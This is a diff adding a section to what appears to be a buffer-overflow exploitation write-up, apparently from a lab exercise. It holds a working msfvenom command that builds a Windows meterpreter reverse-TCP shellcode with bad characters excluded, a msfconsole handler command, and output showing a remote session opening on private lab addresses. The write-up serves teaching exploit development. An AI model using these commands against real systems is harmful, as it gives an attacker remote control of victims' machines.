@@ -687,3 +687,22 @@ After sending the payload with the exact offset, we can see that EIP points to e
 024de503  cccccc43
 ```
 **Note: the instruction CC (int 3, software breakpoint) has been executed in order to verify that everything works.**
+
+# Replacing our shellcode
+Now we have to use a proper reverse shell shellcode.
+Let's create it taking into account the badchars:
+```c
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
+```
+
+The output shellcode is 544 bytes. We have space, we must check EIP once we have redirected the flow to see how much bytes we can put.
+```c
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.100; set LPORT 8080; exploit"
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 192.168.0.100
+LPORT => 8080
+[*] Started reverse TCP handler on 192.168.0.100:8080 
+[*] Sending stage (177734 bytes) to 192.168.0.101
+[*] Meterpreter session 1 opened (192.168.0.100:8080 -> 192.168.0.101:57933) at 2025-06-08 13:33:56 -0400
+```
